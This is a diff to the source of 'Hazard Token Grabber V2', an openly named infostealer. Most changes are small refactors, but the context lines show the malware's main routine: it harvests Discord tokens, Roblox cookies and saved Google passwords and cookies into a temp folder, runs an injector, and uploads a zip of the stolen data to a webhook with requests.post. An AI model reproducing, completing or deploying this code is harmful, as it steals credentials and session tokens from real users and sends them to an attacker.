@@ -82,20 +82,17 @@ class Hazard_Token_Grabber_V2(functions):
         self.grabTokens()
         self.neatifyTokens()
         self.grabRobloxCookie()
-        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
+        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
                 with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                     x = ff.read()
-                    if not x:
+                    if x:
                         with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                             f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                         with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                             fp.write(x+"\n\nMade by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2")
                     else:
-                        try:
-                            os.remove(self.tempfolder+os.sep+i)
-                        except Exception:
-                            print("ok")
+                        os.remove(self.tempfolder+os.sep+i)
 
         self.SendInfo()
         self.injector()
@@ -277,7 +274,7 @@ class Hazard_Token_Grabber_V2(functions):
         for _, path in paths.items():
             if not os.path.exists(path):
                 continue
-            if not "discord" in path:
+            if "discord" not in path:
                 for file_name in os.listdir(path):
                     if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                         continue
@@ -401,5 +398,5 @@ class Hazard_Token_Grabber_V2(functions):
         requests.post(self.webhook, files={'upload_file': open(_zipfile,'rb')})
         os.remove(_zipfile)
 
-if __name__ == "__main__":
-    if os.name == "nt": Hazard_Token_Grabber_V2()
+if __name__ == "__main__" and os.name == "nt":
+    Hazard_Token_Grabber_V2()
